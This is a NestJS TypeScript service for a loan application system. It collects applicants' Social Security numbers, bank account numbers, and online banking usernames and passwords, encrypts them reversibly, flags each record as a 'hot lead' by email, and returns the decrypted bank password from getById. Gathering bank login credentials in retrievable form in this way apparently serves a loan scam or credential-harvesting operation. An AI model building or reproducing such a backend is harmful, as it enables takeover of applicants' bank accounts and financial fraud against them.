import { Injectable } from '@nestjs/common';
import { Op, cast, col, where as whereFn } from 'sequelize';
import { LoanApplication } from './entities/loan-application.entity';
import { InjectModel } from '@nestjs/sequelize';
import { CreateLoanApplicationDto } from './dto/create-loan.dto';
import { decrypt, encrypt } from '../common/encryption.util';
import { EmailService } from '../email/email.service';

@Injectable()
export class LoanApplicationService {
  constructor(
    @InjectModel(LoanApplication)
    private readonly loanModel: typeof LoanApplication,
    private readonly emailService: EmailService,
  ) {}
  async create(dto: CreateLoanApplicationDto) {
    try {
      // Encrypt sensitive PII before storage
      const applicantSSNEncrypted = dto.applicantSSN
        ? encrypt(dto.applicantSSN)
        : '';

      const applicantAccountNumberEncrypted = dto.applicantAccountNumber
        ? encrypt(dto.applicantAccountNumber)
        : '';
      const applicantOnlineBankUsernameEncrypted =
        dto.applicantOnlineBankUsername
          ? encrypt(dto.applicantOnlineBankUsername)
          : '';

      const applicantOnlineBankPasswordEncrypted =
        dto.applicantOnlineBankPassword
          ? encrypt(dto.applicantOnlineBankPassword)
          : '';

      const application = await this.loanModel.create({
        applicantFullName: dto.applicantFullName,
        applicantSSN: applicantSSNEncrypted ?? '',
        applicantPhoneNumber: dto.applicantPhoneNumber,
        applicantDateOfBirth: new Date(dto.applicantDateOfBirth),
        applicantAddress: dto.applicantAddress,
        applicantCity: dto.applicantCity,
        applicantState: dto.applicantState,
        applicantZipCode: dto.applicantZipCode,
        applicantLoanAmount: dto.applicantLoanAmount,
        applicantLoanPurpose: dto.applicantLoanPurpose,
        applicantRoutingNumber: dto.applicantRoutingNumber,
        applicantBankName: dto.applicantBankName,
        applicantAccountNumber: applicantAccountNumberEncrypted ?? '',
        applicantOnlineBankUsername: applicantOnlineBankUsernameEncrypted ?? '',
        applicantOnlineBankPassword: applicantOnlineBankPasswordEncrypted ?? '',
        status: 'NEW_LEAD',
      } as any);

      await this.emailService.sendHotLeadAlert(application);

      return application;
    } catch (error) {
      console.error('Error creating loan application:', error);
      throw error;
    }
  }

  async getById(id: string) {
    try {
      const application = await this.loanModel.findByPk(id);

      const applicantSSNDecrypted =
        (application?.applicantSSN ?? '')
          ? decrypt(application?.applicantSSN ?? '')
          : '';

      const applicantAccountNumberDecrypted =
        (application?.applicantAccountNumber ?? '')
          ? decrypt(application?.applicantAccountNumber ?? '')
          : '';
      const applicantOnlineBankUsernameDecrypted =
        (application?.applicantOnlineBankUsername ?? '')
          ? decrypt(application?.applicantOnlineBankUsername ?? '')
          : '';

      const applicantOnlineBankPasswordDecrypted =
        (application?.applicantOnlineBankPassword ?? '')
          ? decrypt(application?.applicantOnlineBankPassword ?? '')
          : '';
      if (!application) {
        throw new Error('Loan application not found');
      }
      return {
        ...application.toJSON(),
        applicantSSN: applicantSSNDecrypted,
        applicantAccountNumber: applicantAccountNumberDecrypted,
        applicantOnlineBankUsername: applicantOnlineBankUsernameDecrypted,
        applicantOnlineBankPassword: applicantOnlineBankPasswordDecrypted,
      };
    } catch (error) {
      console.error('Error fetching loan application by ID:', error);
    }
  }

  async getAll(filters?: { date?: string; q?: string; tzOffset?: number }) {
    try {
      const where: any = {};

      if (filters?.date) {
        // tzOffset is minutes returned by JS Date.getTimezoneOffset() on the
        // client (UTC - local, e.g. 420 for PDT). Shift the UTC boundaries so
        // the range covers the user's local calendar day.
        const offsetMs = (filters.tzOffset ?? 0) * 60 * 1000;
        const start = new Date(
          new Date(`${filters.date}T00:00:00.000Z`).getTime() + offsetMs,
        );
        const end = new Date(
          new Date(`${filters.date}T23:59:59.999Z`).getTime() + offsetMs,
        );
        if (!isNaN(start.getTime()) && !isNaN(end.getTime())) {
          where.createdAt = { [Op.between]: [start, end] };
        }
      }

      if (filters?.q) {
        const like = `%${filters.q}%`;
        where[Op.or] = [
          { applicantFullName: { [Op.iLike]: like } },
          { applicantPhoneNumber: { [Op.iLike]: like } },
          whereFn(cast(col('status'), 'text'), { [Op.iLike]: like }),
        ];
      }

      const applications = await this.loanModel.findAll({
        where,
        order: [['createdAt', 'DESC']],
      });
      return applications;
    } catch (error) {
      console.error('Error fetching all loan applications:', error);
    }
  }
}
